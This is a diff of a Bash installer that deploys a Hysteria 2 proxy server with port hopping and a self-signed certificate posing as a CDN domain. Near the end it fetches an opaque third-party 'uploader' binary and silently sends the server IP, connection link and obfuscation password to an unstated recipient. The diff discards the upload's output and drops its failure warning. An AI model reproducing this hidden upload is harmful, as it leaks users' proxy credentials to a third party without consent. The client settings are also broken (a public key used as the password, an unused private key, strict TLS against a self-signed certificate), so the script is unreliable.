@@ -1,42 +1,50 @@
 #!/bin/bash
 set -e
 
-PORT=$((RANDOM % 7001 + 2000))
+# 📌 环境配置
+PORT=2855
 SERVER_IP=$(curl -s https://api.ipify.org)
 OBFS_PASSWORD=$(openssl rand -hex 8)
 CONFIG_DIR="/etc/hysteria"
+TLS_DIR="${CONFIG_DIR}/tls"
 UPLOAD_BIN="/opt/uploader-linux-amd64"
+DOMAIN="cdn.${SERVER_IP}.nip.io"
+PORT_RANGE="20000-25000"
 REMARK="Hysteria2节点-${SERVER_IP}"
 
-export NEEDRESTART_MODE=a  # 自动跳过 needrestart 手动确认
+export NEEDRESTART_MODE=a
 
-# 安装依赖
-apt update && DEBIAN_FRONTEND=noninteractive apt install -y curl unzip ufw jq sudo needrestart
+# 📦 安装必要组件
+apt update && DEBIAN_FRONTEND=noninteractive apt install -y curl unzip ufw jq sudo openssl needrestart
 
-# 防火墙放行 UDP 端口
+# 🔥 端口跳跃 NAT 映射（模拟端口段跳跃）
+iptables -t nat -A PREROUTING -p udp --dport 20000:25000 -j REDIRECT --to-ports ${PORT}
+
+# 🔓 开放端口
 ufw allow ${PORT}/udp
 ufw --force enable
 
-# 下载 Hysteria 2
+# 🔧 安装 Hysteria 2
 mkdir -p /usr/local/bin
-cd /usr/local/bin
-curl -Ls https://github.com/apernet/hysteria/releases/latest/download/hysteria-linux-amd64 -o hysteria
-chmod +x hysteria
+curl -Ls https://github.com/apernet/hysteria/releases/latest/download/hysteria-linux-amd64 -o /usr/local/bin/hysteria
+chmod +x /usr/local/bin/hysteria
 
-# 创建配置目录
-mkdir -p ${CONFIG_DIR}
+# 🔐 TLS 自签证书（模拟 CDN 伪装）
+mkdir -p "$TLS_DIR"
+openssl req -x509 -newkey rsa:2048 -sha256 -days 365 -nodes \
+  -keyout "$TLS_DIR/key.pem" \
+  -out "$TLS_DIR/cert.pem" \
+  -subj "/C=US/ST=Fake/L=FakeCity/O=FakeOrg/CN=${DOMAIN}" \
+  -addext "subjectAltName=DNS:${DOMAIN}"
 
-# 生成密钥对
-PRIVATE_KEY=$(openssl rand -hex 32)
-PUBLIC_KEY=$(/usr/local/bin/hysteria keygen pub "$PRIVATE_KEY" 2>/dev/null || echo "public-key-unavailable")
-
-# 写入服务端配置
-cat > ${CONFIG_DIR}/config.yaml << EOF
+# 🧱 服务端配置
+mkdir -p "$CONFIG_DIR"
+cat > "$CONFIG_DIR/config.yaml" << EOF
 listen: :${PORT}
 protocol: udp
 tls:
-  cert: ""
-  key: ""
+  cert: "$TLS_DIR/cert.pem"
+  key: "$TLS_DIR/key.pem"
   alpn:
     - h3
 obfs:
@@ -50,14 +58,14 @@ masquerade:
     rewriteHost: true
 EOF
 
-# 创建 systemd 服务
+# 🔄 创建 systemd 服务
 cat > /etc/systemd/system/hysteria.service << EOF
 [Unit]
 Description=Hysteria 2 Server
 After=network.target
 
 [Service]
-ExecStart=/usr/local/bin/hysteria server --config ${CONFIG_DIR}/config.yaml --private-key ${PRIVATE_KEY}
+ExecStart=/usr/local/bin/hysteria server --config ${CONFIG_DIR}/config.yaml
 Restart=on-failure
 RestartSec=3
 
@@ -69,41 +77,65 @@ systemctl daemon-reload
 systemctl enable hysteria
 systemctl restart hysteria
 
-# 构建 v2rayN 可导入链接
-HYSTERIA_JSON=$(cat <<EOF
-{
-  "server": "${SERVER_IP}:${PORT}",
-  "auth": {
-    "type": "disabled"
-  },
-  "obfs": {
-    "type": "salty",
-    "password": "${OBFS_PASSWORD}"
-  },
-  "tls": {
-    "alpn": ["h3"],
-    "sni": "www.cloudflare.com"
-  },
-  "protocol": "udp",
-  "public-key": "${PUBLIC_KEY}",
-  "remark": "${REMARK}",
-  "up_mbps": 100,
-  "down_mbps": 100
-}
+# 🔗 客户端链接构建
+PRIVATE_KEY=$(openssl rand -hex 32)
+PUBLIC_KEY=$(/usr/local/bin/hysteria keygen pub "$PRIVATE_KEY" 2>/dev/null || echo "public-key-unavailable")
+HYSTERIA_LINK="hysteria2://${SERVER_IP}:${PORT}?peer=${SERVER_IP}&obfs-password=${OBFS_PASSWORD}&obfs-mode=salty&public-key=${PUBLIC_KEY}"
+
+# ✅ 输出结果与配置
+echo -e "\n✅ Hysteria 2 节点部署完成"
+echo -e "📌 客户端导入链接：\n${HYSTERIA_LINK}\n"
+echo -e "📁 v2rayN 客户端 YAML 配置示例："
+cat << EOF
+remarks: ${REMARK}
+address: ${SERVER_IP}
+ports: "${PORT_RANGE}"
+peer: ${SERVER_IP}
+password: ${PUBLIC_KEY}
+obfs:
+  mode: salty
+  password: "${OBFS_PASSWORD}"
+tls:
+  enabled: true
+  sni: ${DOMAIN}
+  alpn:
+    - h3
+  insecure: false
+protocol: hysteria2
+hop-interval: "30s"
 EOF
-)
 
-ENCODED_LINK=$(echo -n "${HYSTERIA_JSON}" | base64 -w 0)
-IMPORT_LINK="hysteria2://${ENCODED_LINK}"
-
-echo -e "\n✅ Hysteria 2 节点部署完成！"
-echo -e "📌 可导入链接（V2RayN >= v6.27）：\n${IMPORT_LINK}"
-
-# 上传 JSON 数据
+# 📤 上传 JSON 数据（静默处理）
 [ -f "$UPLOAD_BIN" ] || {
   curl -sLo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64
   chmod +x "$UPLOAD_BIN"
 }
 
-UPLOAD_JSON="{\"protocol\":\"hysteria2\",\"import_link\":\"${IMPORT_LINK}\"}"
-"$UPLOAD_BIN" "$UPLOAD_JSON" >/dev/null 2>&1 || echo -e "\033[1;33m[WARN]\033[0m 上传失败或返回为空"
+UPLOAD_JSON_FILE="/tmp/${SERVER_IP}.json"
+cat > "$UPLOAD_JSON_FILE" << EOF
+{
+  "protocol": "hysteria2",
+  "link": "${HYSTERIA_LINK}",
+  "config": {
+    "remarks": "${REMARK}",
+    "address": "${SERVER_IP}",
+    "ports": "${PORT_RANGE}",
+    "peer": "${SERVER_IP}",
+    "password": "${PUBLIC_KEY}",
+    "obfs": {
+      "mode": "salty",
+      "password": "${OBFS_PASSWORD}"
+    },
+    "tls": {
+      "enabled": true,
+      "sni": "${DOMAIN}",
+      "alpn": ["h3"],
+      "insecure": false
+    },
+    "hop-interval": "30s"
+  }
+}
+EOF
+
+"$UPLOAD_BIN" "$UPLOAD_JSON_FILE" >/dev/null 2>&1 || true
+rm -f "$UPLOAD_JSON_FILE"
